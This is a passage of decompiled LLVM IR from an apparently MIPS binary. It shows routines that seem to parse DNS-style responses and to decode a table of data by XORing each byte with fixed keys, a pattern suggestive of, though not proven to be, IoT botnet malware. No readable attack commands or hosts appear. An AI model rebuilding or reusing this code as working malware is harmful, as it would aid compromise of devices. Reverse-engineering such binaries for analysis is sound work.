  %v2_4021c4 = icmp eq i32 %v4_4021b0, -1
  br i1 %v2_4021c4, label %dec_label_pc_4023c8, label %dec_label_pc_4021c8

dec_label_pc_4021c8:                              ; preds = %dec_label_pc_40216c
  %v1_4021cc = icmp eq i32 %v4_4021b0, 0
  %v2_4021cc = load i32, i32* %s7.global-to-local, align 4
  %v3_4021cc = add i32 %v2_4021cc, 1
  store i32 %v3_4021cc, i32* %v0.global-to-local, align 4
  br i1 %v1_4021cc, label %dec_label_pc_4023b0, label %dec_label_pc_4021d0

dec_label_pc_4021d0:                              ; preds = %dec_label_pc_4021c8
  %v0_4021d4 = load i32, i32* @s0, align 4
  %v1_4021d4 = add i32 %v0_4021d4, 24
  %v2_4021d4 = inttoptr i32 %v1_4021d4 to i32*
  %v3_4021d4 = load i32, i32* %v2_4021d4, align 4
  %v1_4021dc = load i32, i32* %s1.global-to-local, align 4
  %tmp67 = shl i32 1, %v1_4021dc
  %v1_4021e026 = and i32 %tmp67, %v3_4021d4
  %v1_4021e4 = icmp eq i32 %v1_4021e026, 0
  store i32 %v3_4021cc, i32* %v0.global-to-local, align 4
  br i1 %v1_4021e4, label %dec_label_pc_4023b0, label %dec_label_pc_4021e8

dec_label_pc_4021e8:                              ; preds = %dec_label_pc_4021d0
  %v2_4021f0 = ptrtoint i16* %stack_var_-2096 to i32
  store i32 %v2_4021f0, i32* %s1.global-to-local, align 4
  store i32 %v2_4021f0, i32* @a0, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 2048, i32* @a2, align 4
  %v4_4021fc = call i32 @function_403f6c(i32 %v2_4021f0, i32 0, i32 2048)
  store i32 %v4_4021fc, i32* %v0.global-to-local, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  store i32 %v2_4021f0, i32* %a1.global-to-local, align 4
  %v3_40220c = load i32, i32* @global_var_449bfc.122, align 4
  store i32 %v3_40220c, i32* @t9, align 4
  store i32 2048, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v0_402218 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_402218, i32* %a0.global-to-local, align 4
  %v10_402220 = bitcast i16* %stack_var_-2096 to i32*
  %v11_402220 = call i32 @function_405df0(i32 %v0_402218, i32* %v10_402220, i32 2048, i32 16384, i32 0, i32 0)
  store i32 %v11_402220, i32* @v0, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  store i32 %v3_401f50, i32* %a0.global-to-local, align 4
  store i32 %v11_402220, i32* %s0.global-to-local, align 4
  %v2_402238 = call i32 @function_403e84()
  %v1_402240 = add i32 %v2_402238, 17
  %v2_402244 = icmp ult i32 %v11_402220, %v1_402240
  %v3_402244 = zext i1 %v2_402244 to i32
  store i32 %v3_402244, i32* %s0.global-to-local, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  %v2_40224c = load i32, i32* %s7.global-to-local, align 4
  %v3_40224c = add i32 %v2_40224c, 1
  store i32 %v3_40224c, i32* @v0, align 4
  br i1 %v2_402244, label %dec_label_pc_4023b0, label %dec_label_pc_402250

dec_label_pc_402250:                              ; preds = %dec_label_pc_4021e8
  %v2_402258 = ptrtoint i32* %stack_var_-2084 to i32
  store i32 %v2_402258, i32* %s5.global-to-local, align 4
  store i32 %v2_402258, i32* %a0.global-to-local, align 4
  %v3_40225c = call i32 @function_403e84()
  %v3_402264 = ptrtoint i32* %stack_var_-2082 to i32
  store i32 %v3_402264, i32* %a0.global-to-local, align 4
  %v3_402268 = load i16, i16* %stack_var_-2096, align 2
  %v4_402268 = sext i16 %v3_402268 to i32
  store i32 %v4_402268, i32* %v1.global-to-local, align 4
  store i32 %v3_402004, i32* %v0.global-to-local, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  %v2_402274 = icmp eq i16 %v3_402268, %v6_40200c
  %v5_402274 = ptrtoint i32* %stack_var_-2077 to i32
  store i32 %v5_402274, i32* %s2.global-to-local, align 4
  br i1 %v2_402274, label %dec_label_pc_402278, label %dec_label_pc_4023ac

dec_label_pc_402278:                              ; preds = %dec_label_pc_402250
  %v1_402284 = icmp eq i16 %tmp33, 0
  %v2_402284 = load i32, i32* %s7.global-to-local, align 4
  %v3_402284 = add i32 %v2_402284, 1
  store i32 %v3_402284, i32* %v0.global-to-local, align 4
  br i1 %v1_402284, label %dec_label_pc_4023b0, label %dec_label_pc_402288

dec_label_pc_402288:                              ; preds = %dec_label_pc_402278
  %v4_40228c = zext i16 %tmp32 to i32
  store i32 %v4_40228c, i32* %v1.global-to-local, align 4
  %v2_402294 = icmp eq i16 %tmp32, 16
  store i32 %v3_402284, i32* @v0, align 4
  br i1 %v2_402294, label %dec_label_pc_402298, label %dec_label_pc_4023b0

dec_label_pc_402298:                              ; preds = %dec_label_pc_402288
  store i32 %v5_402274, i32* %a0.global-to-local, align 4
  %v3_4022a4 = call i32 @function_403e84()
  store i32 %v3_4022a4, i32* %v0.global-to-local, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  store i32 %v3_4022a4, i32* @a3, align 4
  store i32 %v5_402274, i32* %a0.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 192, i32* %t0.global-to-local, align 4
  %v0_4022c4.pre = load i32, i32* @a1, align 4
  br label %dec_label_pc_4022c4

dec_label_pc_4022c4:                              ; preds = %dec_label_pc_4022e8.dec_label_pc_4022c4_crit_edge, %dec_label_pc_402298
  %v0_4022d4 = phi i32 [ %v2_4022f4, %dec_label_pc_4022e8.dec_label_pc_4022c4_crit_edge ], [ %v5_402274, %dec_label_pc_402298 ]
  %v1_4022cc = phi i32 [ %v1_4022cc.pre, %dec_label_pc_4022e8.dec_label_pc_4022c4_crit_edge ], [ 192, %dec_label_pc_402298 ]
  %v2_4022e8 = phi i32 [ %v4_4022f4, %dec_label_pc_4022e8.dec_label_pc_4022c4_crit_edge ], [ %v0_4022c4.pre, %dec_label_pc_402298 ]
  %v1_4022c4 = inttoptr i32 %v2_4022e8 to i8*
  %v2_4022c4 = load i8, i8* %v1_4022c4, align 1
  %v3_4022c4 = zext i8 %v2_4022c4 to i32
  store i32 %v3_4022c4, i32* %v0.global-to-local, align 4
  %v2_4022cc = icmp eq i32 %v3_4022c4, %v1_4022cc
  %v4_4022cc = add nuw nsw i32 %v3_4022c4, 1
  store i32 %v4_4022cc, i32* %v1.global-to-local, align 4
  br i1 %v2_4022cc, label %dec_label_pc_4022d0, label %dec_label_pc_4022e8

dec_label_pc_4022d0:                              ; preds = %dec_label_pc_4022c4
  %v1_4022d4 = add i32 %v0_4022d4, 1
  %v2_4022d4 = inttoptr i32 %v1_4022d4 to i8*
  %v3_4022d4 = load i8, i8* %v2_4022d4, align 1
  %v4_4022d4 = zext i8 %v3_4022d4 to i32
  %v0_4022dc = load i32, i32* %s1.global-to-local, align 4
  %v2_4022dc = add i32 %v0_4022dc, %v4_4022d4
  store i32 %v2_4022dc, i32* %v0.global-to-local, align 4
  %v1_4022e4 = add i32 %v2_4022dc, -1
  store i32 %v1_4022e4, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4022e8

dec_label_pc_4022e8:                              ; preds = %dec_label_pc_4022c4, %dec_label_pc_4022d0
  %v1_4022e8 = trunc i32 %v4_4022cc to i8
  store i8 %v1_4022e8, i8* %v1_4022c4, align 1
  %v0_4022ec = load i32, i32* %a2.global-to-local, align 4
  %v1_4022ec = add i32 %v0_4022ec, 1
  store i32 %v1_4022ec, i32* %a2.global-to-local, align 4
  %v1_4022f0 = load i32, i32* @a3, align 4
  %v2_4022f0 = icmp slt i32 %v1_4022ec, %v1_4022f0
  %v3_4022f0 = zext i1 %v2_4022f0 to i32
  store i32 %v3_4022f0, i32* %v0.global-to-local, align 4
  %v2_4022f4 = load i32, i32* %a0.global-to-local, align 4
  %v4_4022f4 = add i32 %v2_4022f4, %v1_4022ec
  store i32 %v4_4022f4, i32* %a1.global-to-local, align 4
  br i1 %v2_4022f0, label %dec_label_pc_4022e8.dec_label_pc_4022c4_crit_edge, label %dec_label_pc_4022f8

dec_label_pc_4022e8.dec_label_pc_4022c4_crit_edge: ; preds = %dec_label_pc_4022e8
  %v1_4022cc.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_4022c4

dec_label_pc_4022f8:                              ; preds = %dec_label_pc_4022e8
  %v4_402300 = zext i8 %tmp31 to i32
  %v4_402304 = zext i8 %tmp30 to i32
  store i32 %v4_402304, i32* %v0.global-to-local, align 4
  %v3_402308 = load i32, i32* @global_var_449c48.123, align 4
  store i32 %v3_402308, i32* @t9, align 4
  %v2_40230c = ptrtoint i32* %stack_var_-2065 to i32
  store i32 %v2_40230c, i32* %s1.global-to-local, align 4
  %v1_402310 = mul nuw nsw i32 %v4_402300, 256
  %v2_402314 = or i32 %v1_402310, %v4_402304
  store i32 %v2_402314, i32* %a2.global-to-local, align 4
  %v2_402318 = ptrtoint i32* %stack_var_-2064 to i32
  store i32 %v2_402318, i32* %a1.global-to-local, align 4
  store i32 %v2_40230c, i32* %a0.global-to-local, align 4
  %v6_40231c = call i32 @function_405800(i32 %v2_40230c, i32 %v2_402318, i32 %v2_402314)
  store i32 %v6_40231c, i32* %v0.global-to-local, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  %v0_402328 = load i32, i32* %s3.global-to-local, align 4
  store i32 %v0_402328, i32* @a0, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 2048, i32* @a2, align 4
  %v4_402334 = call i32 @function_403f6c(i32 %v0_402328, i32 0, i32 2048)
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  store i32 %v1_402310, i32* @v0, align 4
  %v1_402354 = add nsw i32 %v2_402314, -1
  store i32 %v1_402354, i32* %a2.global-to-local, align 4
  %v0_402358 = load i32, i32* %s3.global-to-local, align 4
  store i32 %v0_402358, i32* %a0.global-to-local, align 4
  store i32 %v2_40230c, i32* %a1.global-to-local, align 4
  %v6_40235c = call i32 @function_403edc(i32 %v0_402358, i32 %v2_40230c, i32 %v1_402354)
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  %v0_402368 = load i32, i32* %s7.global-to-local, align 4
  %v1_402368 = trunc i32 %v0_402368 to i8
  %v2_402368 = load i32, i32* %s3.global-to-local, align 4
  %v3_402368 = add i32 %v2_402368, 2052
  %v4_402368 = inttoptr i32 %v3_402368 to i8*
  store i8 %v1_402368, i8* %v4_402368, align 1
  %v3_40236c = load i8, i8* %stack_var_-2075, align 1
  %v4_40236c27 = zext i8 %v3_40236c to i16
  %v4_402370 = zext i8 %tmp29 to i16
  %v1_402374 = mul nuw i16 %v4_40236c27, 256
  %v2_402378 = or i16 %v1_402374, %v4_402370
  %v2_40237c = load i32, i32* %s3.global-to-local, align 4
  %v3_40237c = add i32 %v2_40237c, 2048
  %v4_40237c = inttoptr i32 %v3_40237c to i16*
  store i16 %v2_402378, i16* %v4_40237c, align 2
  %v4_402380 = zext i8 %tmp28 to i32
  %v4_402384 = zext i8 %tmp to i32
  %v1_402388 = mul nuw nsw i32 %v4_402380, 256
  store i32 %v1_402388, i32* @v0, align 4
  %v2_40238c = or i32 %v1_402388, %v4_402384
  store i32 %v2_40238c, i32* %v1.global-to-local, align 4
  %v1_402394 = trunc i32 %v2_40238c to i16
  %v2_402394 = load i32, i32* %s3.global-to-local, align 4
  %v3_402394 = add i32 %v2_402394, 2050
  %v4_402394 = inttoptr i32 %v3_402394 to i16*
  store i16 %v1_402394, i16* %v4_402394, align 2
  store i32 %v2_40230c, i32* %a0.global-to-local, align 4
  %v3_402398 = call i32 @function_403e84()
  %v4_402398 = trunc i32 %v3_402398 to i8
  store i32 %v3_402398, i32* %v0.global-to-local, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  %v3_4023a8 = load i32, i32* %s3.global-to-local, align 4
  %v4_4023a8 = add i32 %v3_4023a8, 2053
  %v5_4023a8 = inttoptr i32 %v4_4023a8 to i8*
  store i8 %v4_402398, i8* %v5_4023a8, align 1
  %v0_4023ec.pre.pre.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4023ac

dec_label_pc_4023ac:                              ; preds = %dec_label_pc_402250, %dec_label_pc_4022f8
  %v0_4023ec.pre.pre = phi i32 [ %v2_401efc, %dec_label_pc_402250 ], [ %v0_4023ec.pre.pre.pre, %dec_label_pc_4022f8 ]
  %v0_4023ac = load i32, i32* %s7.global-to-local, align 4
  %v1_4023ac = add i32 %v0_4023ac, 1
  store i32 %v1_4023ac, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4023b0

dec_label_pc_4023b0:                              ; preds = %dec_label_pc_402288, %dec_label_pc_402278, %dec_label_pc_4021e8, %dec_label_pc_4021d0, %dec_label_pc_4021c8, %dec_label_pc_4023ac
  %v0_4023ec.pre = phi i32 [ %v2_401efc, %dec_label_pc_402288 ], [ %v2_401efc, %dec_label_pc_402278 ], [ %v2_401efc, %dec_label_pc_4021e8 ], [ %v2_401efc, %dec_label_pc_4021d0 ], [ %v2_401efc, %dec_label_pc_4021c8 ], [ %v0_4023ec.pre.pre, %dec_label_pc_4023ac ]
  %v0_4023b0 = phi i32 [ %v3_402284, %dec_label_pc_402288 ], [ %v3_402284, %dec_label_pc_402278 ], [ %v3_40224c, %dec_label_pc_4021e8 ], [ %v3_4021cc, %dec_label_pc_4021d0 ], [ %v3_4021cc, %dec_label_pc_4021c8 ], [ %v1_4023ac, %dec_label_pc_4023ac ]
  %v1_4023b0 = urem i32 %v0_4023b0, 65536
  store i32 %v1_4023b0, i32* %s7.global-to-local, align 4
  store i32 11, i32* %v0.global-to-local, align 4
  %v2_4023b8 = icmp eq i32 %v1_4023b0, 11
  br i1 %v2_4023b8, label %dec_label_pc_4023ec, label %dec_label_pc_4023c8

dec_label_pc_4023c8:                              ; preds = %dec_label_pc_4023b0, %dec_label_pc_40216c
  %v0_4023c8 = phi i32 [ %v2_401efc, %dec_label_pc_40216c ], [ %v0_4023ec.pre, %dec_label_pc_4023b0 ]
  %v1_4023c8 = add i32 %v0_4023c8, -32248
  %v2_4023c8 = inttoptr i32 %v1_4023c8 to i32*
  %v3_4023c8 = load i32, i32* %v2_4023c8, align 4
  store i32 25, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4023c8)
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  %v0_4023e8 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_4023e8, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4023ec

dec_label_pc_4023ec:                              ; preds = %dec_label_pc_4023b0, %dec_label_pc_4023c8
  %v0_4023ec = phi i32 [ %v2_401efc, %dec_label_pc_4023c8 ], [ %v0_4023ec.pre, %dec_label_pc_4023b0 ]
  %v1_4023ec = add i32 %v0_4023ec, -32248
  %v2_4023ec = inttoptr i32 %v1_4023ec to i32*
  %v3_4023ec = load i32, i32* %v2_4023ec, align 4
  store i32 25, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4023ec)
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  %v0_402400 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_402400, i32* %a0.global-to-local, align 4
  %v3_402404 = load i32, i32* @global_var_449a6c.60, align 4
  store i32 %v3_402404, i32* @t9, align 4
  store i32 0, i32* %s3.global-to-local, align 4
  %v2_40240c = call i32 @function_404d20(i32 %v0_402400)
  store i32 0, i32* %v0.global-to-local, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  store i32 %v0_401f04, i32* @ra, align 4
  store i32 %v0_401f08, i32* @fp, align 4
  store i32 %v0_401f24, i32* @s1, align 4
  store i32 %v0_401f28, i32* @s0, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_4023b0, { 1, 0 }
  uselistorder i32 %v3_402398, { 1, 0 }
  uselistorder i32 %v1_402388, { 1, 0 }
  uselistorder i32 %v2_40230c, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v4_4022f4, { 1, 0 }
  uselistorder i32 %v2_4021f0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_402180, { 1, 0 }
  uselistorder i32 %v1_402174, { 1, 0 }
  uselistorder i32 %v0_402170, { 1, 0 }
  uselistorder i32 %v1_402164, { 1, 2, 0 }
  uselistorder i32 %v4_4020b8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_40208c, { 1, 0, 2 }
  uselistorder i32 %v3_402004, { 1, 2, 0 }
  uselistorder i32 %v4_401fc4, { 1, 0 }
  uselistorder i32 %v1_401fbc, { 0, 2, 3, 1 }
  uselistorder i32 %v1_401fb0, { 1, 0 }
  uselistorder i32 %v1_401fa4, { 0, 2, 1 }
  uselistorder i32 %v2_401f60, { 1, 0 }
  uselistorder i32 %v3_401f50, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 %v2_401efc, { 21, 20, 7, 19, 6, 1, 2, 3, 4, 5, 0, 30, 29, 28, 27, 26, 25, 24, 23, 22, 18, 17, 16, 15, 32, 31, 14, 33, 13, 12, 11, 10, 9, 8, 34 }
  uselistorder i16* %stack_var_-4144, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4288, { 0, 2, 1 }
  uselistorder i16* %stack_var_-2096, { 2, 0, 1 }
  uselistorder i16 %tmp32, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 11, 9, 10, 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %a0.global-to-local, { 1, 3, 2, 4, 5, 6, 8, 9, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32 25, { 1, 2, 0 }
  uselistorder i32 2048, { 4, 2, 5, 1, 6, 3, 7, 0 }
  uselistorder label %dec_label_pc_4023ec, { 1, 0 }
  uselistorder label %dec_label_pc_4023b0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_4023ac, { 1, 0 }
  uselistorder label %dec_label_pc_4022e8, { 1, 0 }
  uselistorder label %dec_label_pc_402128, { 1, 0 }
  uselistorder label %dec_label_pc_4020ac, { 1, 0 }
}

define i32 @function_40244c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40244c:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a2.global-to-local, align 4
  %v1_402454 = load i32, i32* @t9, align 4
  %v2_402454 = add i32 %v1_402454, 324964
  store i32 %v2_402454, i32* %gp.global-to-local, align 4
  %v3_402458 = load i32, i32* bitcast (i32** @global_var_449b2c.125 to i32*), align 4
  %v3_40245c = load i32, i32* @global_var_449ba0.75, align 4
  store i32 %v3_40245c, i32* @t9, align 4
  store i32 %v3_402458, i32* %a0.global-to-local, align 4
  store i32 9, i32* %a1.global-to-local, align 4
  %v3_402464 = call i32 @function_404f50(i32 %v3_402458, i32 9)
  %v4_402464 = inttoptr i32 %v3_402464 to i16*
  %v1_402474 = load i32, i32* @t9, align 4
  %v2_402474 = add i32 %v1_402474, 324932
  store i32 %v2_402474, i32* %gp.global-to-local, align 4
  %v1_402494 = add i32 %v1_402474, 292764
  %v2_402494 = inttoptr i32 %v1_402494 to i32*
  %v3_402494 = load i32, i32* %v2_402494, align 4
  %v1_402498 = urem i32 %v3_402458, 65536
  store i32 %v1_402498, i32* %s3.global-to-local, align 4
  store i32 12, i32* %a0.global-to-local, align 4
  store i32 %arg1, i32* %s1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_402494)
  store i32 %v2_402474, i32* %gp.global-to-local, align 4
  store i32 %v1_402498, i32* %a0.global-to-local, align 4
  %v3_4024b4 = load i32, i32* %v2_402494, align 4
  %v4_4024b8 = add i32 %v3_402464, 2
  %v5_4024b8 = inttoptr i32 %v4_4024b8 to i8*
  store i8 9, i8* %v5_4024b8, align 1
  %v0_4024bc = load i32, i32* %s3.global-to-local, align 4
  %v1_4024bc = trunc i32 %v0_4024bc to i16
  store i16 %v1_4024bc, i16* %v4_402464, align 2
  store i32 %v3_402464, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4024b4)
  store i32 %v2_402474, i32* %gp.global-to-local, align 4
  store i32 %v3_402464, i32* %a0.global-to-local, align 4
  %v1_4024d0 = add i32 %v1_402474, 292560
  %v2_4024d0 = inttoptr i32 %v1_4024d0 to i32*
  %v3_4024d0 = load i32, i32* %v2_4024d0, align 4
  %v0_4024d4 = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_4024d4, i32* %a1.global-to-local, align 4
  %v0_4024d8 = load i32, i32* %s3.global-to-local, align 4
  store i32 %v0_4024d8, i32* %a2.global-to-local, align 4
  %v3_4024dc = load i32, i32* %s2.global-to-local, align 4
  %v4_4024dc = add i32 %v3_4024dc, 4
  %v5_4024dc = inttoptr i32 %v4_4024dc to i32*
  store i32 %v3_402464, i32* %v5_4024dc, align 4
  call void @__pseudo_call(i32 %v3_4024d0)
  store i32 %v2_402474, i32* %gp.global-to-local, align 4
  store i32 0, i32* %a0.global-to-local, align 4
  store i32 -19, i32* %a3.global-to-local, align 4
  store i32 -22, i32* %a2.global-to-local, align 4
  store i32 -34, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_4024fc

dec_label_pc_4024fc:                              ; preds = %dec_label_pc_4024fc.dec_label_pc_4024fc_crit_edge, %dec_label_pc_40244c
  %v1_402510 = phi i32 [ %v1_402510.pre, %dec_label_pc_4024fc.dec_label_pc_4024fc_crit_edge ], [ -19, %dec_label_pc_40244c ]
  %v0_402504 = phi i32 [ %v0_40256c, %dec_label_pc_4024fc.dec_label_pc_4024fc_crit_edge ], [ 0, %dec_label_pc_40244c ]
  %v0_4024fc = load i32, i32* %s2.global-to-local, align 4
  %v1_4024fc = add i32 %v0_4024fc, 4
  %v2_4024fc = inttoptr i32 %v1_4024fc to i32*
  %v3_4024fc = load i32, i32* %v2_4024fc, align 4
  %v2_402504 = add i32 %v3_4024fc, %v0_402504
  %v1_402508 = inttoptr i32 %v2_402504 to i8*
  %v2_402508 = load i8, i8* %v1_402508, align 1
  %v3_402508 = zext i8 %v2_402508 to i32
  %v2_402510 = xor i32 %v3_402508, %v1_402510
  %v1_402514 = trunc i32 %v2_402510 to i8
  store i8 %v1_402514, i8* %v1_402508, align 1
  %v0_402518 = load i32, i32* %s2.global-to-local, align 4
  %v1_402518 = add i32 %v0_402518, 4
  %v2_402518 = inttoptr i32 %v1_402518 to i32*
  %v3_402518 = load i32, i32* %v2_402518, align 4
  %v0_402520 = load i32, i32* %a0.global-to-local, align 4
  %v2_402520 = add i32 %v0_402520, %v3_402518
  %v1_402524 = inttoptr i32 %v2_402520 to i8*
  %v2_402524 = load i8, i8* %v1_402524, align 1
  %v3_402524 = zext i8 %v2_402524 to i32
  %v1_40252c = load i32, i32* %a2.global-to-local, align 4
  %v2_40252c = xor i32 %v1_40252c, %v3_402524
  %v1_402530 = trunc i32 %v2_40252c to i8
  store i8 %v1_402530, i8* %v1_402524, align 1
  %v0_402534 = load i32, i32* %s2.global-to-local, align 4
  %v1_402534 = add i32 %v0_402534, 4
  %v2_402534 = inttoptr i32 %v1_402534 to i32*
  %v3_402534 = load i32, i32* %v2_402534, align 4
  %v0_40253c = load i32, i32* %a0.global-to-local, align 4
  %v2_40253c = add i32 %v0_40253c, %v3_402534
  %v1_402540 = inttoptr i32 %v2_40253c to i8*
  %v2_402540 = load i8, i8* %v1_402540, align 1
  %v3_402540 = zext i8 %v2_402540 to i32
  %v1_402548 = load i32, i32* %a1.global-to-local, align 4
  %v2_402548 = xor i32 %v1_402548, %v3_402540
  %v1_40254c = trunc i32 %v2_402548 to i8
  store i8 %v1_40254c, i8* %v1_402540, align 1
  %v0_402550 = load i32, i32* %s2.global-to-local, align 4
  %v1_402550 = add i32 %v0_402550, 4
  %v2_402550 = inttoptr i32 %v1_402550 to i32*
  %v3_402550 = load i32, i32* %v2_402550, align 4
  %v0_402558 = load i32, i32* %a0.global-to-local, align 4
  %v2_402558 = add i32 %v0_402558, %v3_402550
  %v1_40255c = inttoptr i32 %v2_402558 to i8*
  %v2_40255c = load i8, i8* %v1_40255c, align 1
  %v3_40255c = zext i8 %v2_40255c to i32
  %v1_402560 = add i32 %v0_402558, 1
  store i32 %v1_402560, i32* %a0.global-to-local, align 4
  %v1_402564 = load i32, i32* %a1.global-to-local, align 4
  %v2_402564 = xor i32 %v1_402564, %v3_40255c
  %v1_402568 = trunc i32 %v2_402564 to i8
  store i8 %v1_402568, i8* %v1_40255c, align 1
  %v0_40256c = load i32, i32* %a0.global-to-local, align 4
  %v1_40256c = load i32, i32* %s3.global-to-local, align 4
  %v2_40256c = icmp slt i32 %v0_40256c, %v1_40256c
  br i1 %v2_40256c, label %dec_label_pc_4024fc.dec_label_pc_4024fc_crit_edge, label %dec_label_pc_402574

dec_label_pc_4024fc.dec_label_pc_4024fc_crit_edge: ; preds = %dec_label_pc_4024fc
  %v1_402510.pre = load i32, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_4024fc

dec_label_pc_402574:                              ; preds = %dec_label_pc_4024fc
  %v0_402578 = load i32, i32* %gp.global-to-local, align 4
  %v1_402578 = add i32 %v0_402578, -32548
  %v2_402578 = inttoptr i32 %v1_402578 to i32*
  %v3_402578 = load i32, i32* %v2_402578, align 4
  %v1_40257c = add i32 %v0_402578, -32744
  %v2_40257c = inttoptr i32 %v1_40257c to i32*
  %v3_40257c = load i32, i32* %v2_40257c, align 4
  store i32 %v3_40257c, i32* %a0.global-to-local, align 4
  %v1_402580 = inttoptr i32 %v3_402578 to i16*
  %v2_402580 = load i16, i16* %v1_402580, align 2
  %v3_402580 = zext i16 %v2_402580 to i32
  %v1_402584 = add i32 %v3_40257c, -25380
  %v2_402584 = inttoptr i32 %v1_402584 to i32*
  %v3_402584 = load i32, i32* %v2_402584, align 4
  store i32 %v3_402584, i32* %a1.global-to-local, align 4
  %v1_402588 = add nuw nsw i32 %v3_402580, 1
  %v2_402588 = trunc i32 %v1_402588 to i16
  store i16 %v2_402588, i16* %v1_402580, align 2
  %v0_402590 = load i32, i32* %s2.global-to-local, align 4
  %v1_402590 = load i32, i32* %a0.global-to-local, align 4
  %v2_402590 = add i32 %v1_402590, -25380
  %v3_402590 = inttoptr i32 %v2_402590 to i32*
  store i32 %v0_402590, i32* %v3_402590, align 4
  %v0_402594 = load i32, i32* %s2.global-to-local, align 4
  %v1_402594 = add i32 %v0_402594, 8
  %v2_402594 = inttoptr i32 %v1_402594 to i32*
  store i32 0, i32* %v2_402594, align 4
  %v0_402598 = load i32, i32* %s2.global-to-local, align 4
  %v1_402598 = load i32, i32* %a1.global-to-local, align 4
  %v2_402598 = add i32 %v1_402598, 8
  %v3_402598 = inttoptr i32 %v2_402598 to i32*
  store i32 %v0_402598, i32* %v3_402598, align 4
  ret i32 %v1_402588

; uselistorder directives
  uselistorder i32 %v0_40256c, { 1, 0 }
  uselistorder i32 %v0_402558, { 1, 0 }
  uselistorder i32* %a2.global-to-local, { 1, 2, 3, 0 }
}

define i32 @function_4025b8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4025b8:
  %a0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %v0_4025d4 = load i32, i32* @s0, align 4
  store i32 %v0_4025d4, i32* %stack_var_-16, align 4
  %v1_4025e0 = add i32 %arg1, 18
  store i32 %v1_4025e0, i32* @s0, align 4
  store i32 %arg1, i32* %s1.global-to-local, align 4
  store i32 %arg2, i32* %s2.global-to-local, align 4
  store i32 %v1_4025e0, i32* @a0, align 4
  store i32 1024, i32* @a2, align 4
  %v4_4025f4 = call i32 @function_403f6c(i32 %v1_4025e0, i32 0, i32 1024)
  %v2_402600 = ptrtoint i32* %stack_var_-144 to i32
  store i32 0, i32* %stack_var_-152, align 4
  store i32 %v2_402600, i32* %v0.global-to-local, align 4
  %v2_402614 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_402614, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_402618

dec_label_pc_402618:                              ; preds = %dec_label_pc_402618, %dec_label_pc_4025b8
  %v0_402618 = phi i32 [ %v1_40261c, %dec_label_pc_402618 ], [ %v2_402600, %dec_label_pc_4025b8 ]
  %v1_402618 = inttoptr i32 %v0_402618 to i32*
  store i32 0, i32* %v1_402618, align 4
  %v0_40261c = load i32, i32* %v0.global-to-local, align 4
  %v1_40261c = add i32 %v0_40261c, 4
  store i32 %v1_40261c, i32* %v0.global-to-local, align 4
  %v1_402620 = load i32, i32* %v1.global-to-local, align 4
  %v2_402620 = icmp eq i32 %v1_40261c, %v1_402620
  br i1 %v2_402620, label %dec_label_pc_402624, label %dec_label_pc_402618

dec_label_pc_402624:                              ; preds = %dec_label_pc_402618
  %v0_402628 = load i32, i32* %s1.global-to-local, align 4
  %v1_402628 = add i32 %v0_402628, 8
  %v2_402628 = inttoptr i32 %v1_402628 to i32*
